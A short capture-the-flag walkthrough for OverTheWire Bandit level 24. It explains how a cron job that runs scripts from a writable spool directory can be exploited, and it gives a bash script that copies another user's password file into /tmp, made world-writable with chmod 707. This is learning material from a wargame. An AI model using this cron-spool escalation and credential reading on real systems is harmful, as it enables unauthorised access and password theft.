__ Bandit Level 24 __
---
> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

`cat /usr/bin/cronjob_bandit24.sh` shows that there are scripts being run in /var/spool/bandit24.

`ls -l /var/spool/bandit24` shows that we have write and execute permissions in this directory.

So if we write a script that cats the /etc/bandit_pass/bandit24 to the temp directory, then we have the password.
`vim b24script`
``` bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24pass/pass.txt
```

This script needs permissions for bandit24 to run it.

`chmod 707 b24script`